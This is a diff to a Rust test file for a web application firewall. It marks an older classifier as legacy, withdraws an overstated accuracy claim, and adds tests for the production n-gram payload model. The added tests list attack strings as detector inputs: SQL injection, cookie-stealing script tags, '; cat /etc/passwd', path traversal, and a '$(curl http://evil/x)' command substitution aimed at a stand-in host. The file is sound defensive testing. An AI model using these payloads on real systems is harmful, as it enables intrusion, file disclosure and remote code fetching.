@@ -1,9 +1,28 @@
-//! Detection-accuracy validation for the trained payload classifier.
+//! Detection-accuracy validation for the LEGACY logistic-regression payload
+//! classifier.
 //!
-//! Trains on one split of the bundled labeled corpus and measures
-//! precision / recall / FPR / FNR / F1 on a held-out split it never saw.
-//! This produces the real accuracy numbers a commercial WAF must publish —
-//! run with `--nocapture` to see the confusion matrix and metrics.
+//! # This is NOT the production detection model — read before quoting numbers
+//!
+//! This file measures [`PayloadClassifier`], the 25-feature logistic-regression model
+//! trained from the small bundled corpus. That model does **not** gate blocking
+//! decisions. The production model is the n-gram classifier
+//! (`sentinel_ml::models::ngram_classifier`, weights embedded from
+//! `model/payload_ngram.json`), which is what the proxy consults when it decides
+//! whether to suppress a CRS-only block — see the `ml_benign` check in
+//! `crates/sentinel-proxy/src/lib.rs`.
+//!
+//! The header here previously claimed these were "the real accuracy numbers a
+//! commercial WAF must publish". They are not: they describe a model that is not in
+//! the enforcement path. Anyone citing them as the WAF's accuracy would be quoting the
+//! wrong thing, which is why the claim is removed rather than softened.
+//!
+//! # Where the production model's numbers come from
+//!
+//! `crates/sentinel-ml/training/train_fp_suppression.py`, run with `HOLDOUT=0.15`.
+//! Until that split existed, every metric the trainer printed was measured on its own
+//! training data — the variable was even named `test_adv`, while being the first 2000
+//! lines of a file that was itself in the training set. See
+//! `crates/sentinel-ml/training/README.md` for the measured figures and their limits.
 
 use sentinel_ml::features::FeatureVector;
 use sentinel_ml::models::corpus::training_corpus;
@@ -123,9 +142,11 @@ fn classifier_meets_accuracy_targets_on_holdout() {
 }
 
 #[test]
-fn production_model_separates_attack_from_benign() {
-    // The default (production) classifier trained on the full corpus must score
-    // obvious attacks well above obvious benign requests.
+fn legacy_classifier_separates_attack_from_benign() {
+    // The LEGACY classifier trained on the full bundled corpus must score obvious
+    // attacks above obvious benign requests. Renamed from
+    // `production_model_*`: this model is not in the enforcement path, and the old
+    // name invited exactly the misreading this file's header now warns about.
     let clf = PayloadClassifier::default();
 
     let attacks = training_corpus()
@@ -149,4 +170,99 @@ fn production_model_separates_attack_from_benign() {
     );
     assert!(atk_mean > 0.6, "attack mean score too low: {atk_mean:.3}");
     assert!(ben_mean < 0.4, "benign mean score too high: {ben_mean:.3}");
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// PRODUCTION model gate
+// ─────────────────────────────────────────────────────────────────────────────
+
+/// The n-gram model is the one that actually gates blocking, so it needs a CI floor of
+/// its own. Before this, nothing asserted anything about it.
+///
+/// HONEST SCOPE: these are behavioural floors on unambiguous cases, NOT a
+/// generalisation estimate. The shipped weights were fit on the full corpus, so no
+/// sample available in-repo is genuinely held out from them — asserting an accuracy
+/// figure here would be measuring memorisation and calling it precision, which is the
+/// exact failure this whole fix exists to remove. The generalisation number lives in
+/// the trainer under `HOLDOUT=0.15`; see training/README.md.
+#[test]
+fn production_ngram_model_is_loaded_and_ranks_obvious_cases() {
+    use sentinel_ml::models::ngram_classifier;
+
+    assert!(
+        ngram_classifier::is_loaded(),
+        "the production n-gram model failed to load — the proxy's FP-suppression check \
+         silently degrades to 'never suppress' when this happens, so a load failure must \
+         be a test failure"
+    );
+
+    // Unambiguous attacks must score high.
+    for atk in [
+        "' OR 1=1 --",
+        "1' UNION SELECT username,password FROM users--",
+        "<script>alert(document.cookie)</script>",
+        "<img src=x onerror=alert(1)>",
+        "; cat /etc/passwd",
+        "$(curl http://evil/x)",
+        "../../../../etc/passwd",
+    ] {
+        let s = ngram_classifier::score_all(atk).expect("model loaded, so a score must exist");
+        assert!(
+            s >= 0.5,
+            "attack {atk:?} scored {s:.3} — below 0.5, so the model would not flag it"
+        );
+    }
+
+    // Unambiguous benign values must score low. These are the shapes that generate
+    // real-world false positives: prose, JSON, paths, and SQL-ish English.
+    for benign in [
+        "Hello, I would like to update my shipping address please",
+        "{\"name\":\"Alice\",\"qty\":3,\"note\":\"leave at door\"}",
+        "/api/v1/orders/12345/items",
+        "user@example.com",
+        "The order was selected from the list and updated",
+        "2024-07-25T10:30:00Z",
+    ] {
+        let s = ngram_classifier::score_all(benign).expect("model loaded, so a score must exist");
+        assert!(
+            s < 0.5,
+            "benign {benign:?} scored {s:.3} — at or above 0.5, so the model would \
+             contribute to a false positive"
+        );
+    }
+}
+
+/// The suppression threshold the proxy uses (< 0.15 means "benign enough to suppress a
+/// CRS-only block") must actually separate the two classes above, or the check is
+/// either inert or dangerous.
+#[test]
+fn suppression_threshold_is_meaningful_for_the_production_model() {
+    use sentinel_ml::models::ngram_classifier;
+
+    const SUPPRESS_BELOW: f32 = 0.15; // mirrors crates/sentinel-proxy/src/lib.rs
+
+    // A real attack must NEVER fall below the suppression threshold — that would let
+    // the ML layer veto a correct CRS block.
+    for atk in [
+        "' OR 1=1 --",
+        "<script>alert(1)</script>",
+        "; cat /etc/passwd",
+    ] {
+        let s = ngram_classifier::score_all(atk).expect("model loaded, so a score must exist");
+        assert!(
+            s >= SUPPRESS_BELOW,
+            "attack {atk:?} scored {s:.3} < {SUPPRESS_BELOW} — the FP-suppression path \
+             would VETO a legitimate block for this payload"
+        );
+    }
+
+    // And ordinary prose must fall below it, or suppression never fires and the
+    // precision layer is dead weight.
+    let prose = "Please can you update my delivery address to the new office";
+    let s = ngram_classifier::score_all(prose).expect("model loaded");
+    assert!(
+        s < SUPPRESS_BELOW,
+        "benign prose scored {s:.3} >= {SUPPRESS_BELOW} — FP suppression would never \
+         engage, making the precision layer inert"
+    );
 }
